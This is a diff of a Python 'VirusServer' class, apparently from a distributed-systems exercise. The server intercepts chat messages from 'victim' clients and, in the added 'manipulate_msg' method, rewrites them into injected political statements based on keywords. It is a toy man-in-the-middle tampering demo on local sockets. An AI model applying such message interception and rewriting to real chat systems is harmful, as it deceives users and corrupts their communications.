@@ -3,6 +3,7 @@
 from perfectpointtopointlinks import PerfectPointToPointLinks
 import socket
 import re
+import json
 
 
 class VirusServer:
@@ -13,19 +14,9 @@ class VirusServer:
         self.chat_server_port = 11000
         # a dictionary which acts like a hash map
         self.victim_clients = beb_address_list
+        self.question_words_list = ["where", "how", "why"]
         # This server link is to deliver
         self.server_link = PerfectPointToPointLinks(port=self.PORT, addr_str=self.ADDRESS, arg_callback=self.delivery)
-
-    def send_beb(self, msg, client_list):
-        for victim in client_list:
-            temp_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            try:
-                temp_socket.connect((self.ADDRESS, victim))
-            except socket.error:
-                return
-            message = str(self.PORT) + "+" + msg
-            temp_socket.send(message.encode())
-            temp_socket.close()
 
     def send_p2p(self, sender_port,  msg):
         temp_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -38,7 +29,15 @@ class VirusServer:
         temp_socket.close()
 
     def manipulate_msg(self, msg):
-        return "what?"
+        for qw in self.question_words_list:
+            if msg.__contains__(qw):
+                return qw + " is it still a fact that children get killed in schools due to openly available automated rifles"
+        if msg.__contains__("hey"):
+            return "hey when was the last time you researched immigration policies in America"
+        elif msg.__contains__("do"):
+            return "do you want to join me in the fight against sexism"
+        else:
+            return msg + ", and btw black lives matter"
 
     def delivery(self, sender_port,  message):
         if message is not None:
